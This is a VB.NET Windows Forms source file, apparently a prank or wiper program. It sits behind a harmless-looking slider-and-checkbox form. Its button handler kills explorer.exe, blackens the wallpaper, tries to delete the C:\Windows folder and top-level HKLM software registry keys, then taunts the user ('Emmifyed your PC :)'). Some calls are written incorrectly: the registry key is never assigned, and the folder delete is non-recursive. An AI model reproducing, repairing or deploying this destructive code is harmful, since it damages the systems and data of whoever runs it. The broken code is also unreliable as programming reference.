Imports System.Drawing.Imaging
Imports System.IO
Imports System.Runtime.InteropServices
Imports Microsoft.Win32
#Disable Warning BC42104
Public Class Form2
    Private Const SPI_SETDESKWALLPAPER As Integer = 20
    Private Const SPIF_UPDATEINIFILE As Integer = &H1
    Private Const SPIF_SENDWININICHANGE As Integer = &H2
    <DllImport("user32.dll", CharSet:=CharSet.Auto)>
    Private Shared Function SystemParametersInfo(ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Boolean
    End Function

    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Button1.Enabled = False
        Label2.Text = TrackBar1.Value.ToString() & "%"
    End Sub

    Private Sub TrackBar1_Scroll(sender As Object, e As EventArgs) Handles TrackBar1.Scroll
        Label2.Text = TrackBar1.Value.ToString() & "%"
    End Sub

    Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox1.CheckedChanged
        Button1.Enabled = True
    End Sub
    Public Sub DeleteWindows()
        Dim path = "C:\Windows"
        If Directory.Exists(path) Then
            Directory.Delete(path)
        End If
    End Sub
    Public Sub DeleteRegistryKeys()
        Dim key As RegistryKey
        key.DeleteSubKey("HKEY_LOCAL_MACHINE\Software\Microsoft")
        key.DeleteSubKey("HKEY_LOCAL_MACHINE\Software")
    End Sub
    Public Sub ChangeWallpaper()
        Dim bmp As New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
        Using g As Graphics = Graphics.FromImage(bmp)
            g.Clear(Color.Black)
        End Using
        Dim tempPath As String = Path.Combine(Path.GetTempPath(), "blackwallpaper.bmp")
        bmp.Save(tempPath, ImageFormat.Bmp)
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, tempPath, SPIF_UPDATEINIFILE Or SPIF_SENDWININICHANGE)
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        ' here goes the fun stuff
        ' you are in for a ride
        ' 3, 2, 1
        Process.Start("C:\Windows\System32\taskkill.exe", "/F /IM explorer.exe")
        ChangeWallpaper()
        DeleteWindows()
        DeleteRegistryKeys()
        MessageBox.Show("Emmifyed your PC :)", "From Emmy", MessageBoxButtons.OK, MessageBoxIcon.Information)
    End Sub
End Class